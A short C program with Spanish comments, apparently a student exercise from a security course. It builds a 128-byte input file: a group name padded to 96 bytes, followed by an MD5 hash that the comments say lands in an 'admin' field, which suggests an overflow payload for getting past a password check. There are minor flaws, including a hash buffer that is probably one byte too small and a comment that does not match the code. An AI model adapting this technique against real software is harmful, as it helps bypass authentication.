
#include<string.h>
#include<stdlib.h>
#include<stdio.h>
#include "md5.h"

int main(int argc, char** argv)
{
	char hash[32];
	char pass[] = "De Sousa Bispo, Grosso";
	char buffer[128];
	int i;
	int l = strlen(pass);
	
	// copia el nombre de grupo al buffer
	memcpy(buffer, pass, l);
	
	// rellena pass con Aes
	for( i = l; i < 96 ; i++ )
		buffer[i]=' ';
	
	// copia el hash en admin
	md5_buf_to_hex(buffer, 64, hash);
	memcpy((char*)(buffer+96),hash,32);

	// escribe el archivo
	FILE* f = fopen("die","w+");
	fwrite(buffer,sizeof(char),sizeof(buffer),f);
	fclose(f);

	return 0;
}
